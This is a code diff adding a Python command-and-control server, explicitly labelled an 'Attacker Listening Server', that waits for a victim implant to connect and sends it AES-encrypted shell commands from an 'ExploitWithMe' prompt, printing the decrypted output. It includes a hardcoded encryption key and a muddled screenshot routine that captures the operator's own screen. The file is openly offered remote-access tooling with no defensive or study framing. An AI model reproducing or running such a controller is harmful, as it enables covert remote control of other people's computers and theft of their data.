@@ -1,0 +1,74 @@
+import os
+import socket
+import sys
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+import pyscreenshot as ImageGrab
+
+# Constants
+PORT = 829
+HOST = 'localhost'
+KEY = b'82e672ae054aa4de6f042c888111686a'  # Ensure this is a 16, 24, or 32 byte key for AES
+
+# Function to pad the plaintext to be a multiple of AES block size
+def pad(s):
+    return s + b'\0' * (AES.block_size - len(s) % AES.block_size)
+
+# Function to encrypt plaintext using AES CBC mode
+def encrypt(plaintext):
+    plaintext = pad(plaintext)
+    iv = get_random_bytes(AES.block_size)
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    return iv + cipher.encrypt(plaintext)
+
+# Function to decrypt ciphertext using AES CBC mode
+def decrypt(ciphertext):
+    iv = ciphertext[:AES.block_size]
+    cipher = AES.new(KEY, AES.MODE_CBC, iv)
+    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
+    return plaintext.rstrip(b'\0')
+
+# Function to take a screenshot and save it as 'im.png'
+def screen_shot():
+    try:
+        im = ImageGrab.grab()
+        im.show()
+        im = ImageGrab.grab(bbox=(10, 10, 500, 500))
+        im.show()
+        ImageGrab.grab_to_file('im.png')
+    except Exception as e:
+        print(f"Error occurred while taking screenshot: {e}")
+
+# Main function to start the server and handle commands
+def main():
+    # Create and bind the socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((HOST, PORT))
+    s.listen(10)
+    print(f'Attacker Listening Server Started on Port {PORT}...')
+
+    # Accept a connection
+    conn, _ = s.accept()
+    while True:
+        try:
+            cmd = input('ExploitWithMe >> ').strip()  # Using input() instead of raw_input() for Python 3
+            if cmd == 'grab_screen':
+                screen_shot()
+                os.system("cat im.png")
+            if cmd == '':
+                continue
+            conn.send(encrypt(cmd.encode()))  # Ensure cmd is encoded to bytes
+            if cmd == 'terminate':
+                conn.close()
+                s.close()
+                sys.exit(0)
+            data = conn.recv(4096)
+            print(decrypt(data).decode())
+        except Exception as e:
+            print(f"An error occurred: {e}")
+            conn.close()
+            s.close()
+            sys.exit(1)
+
+if __name__ == '__main__':
+    main()
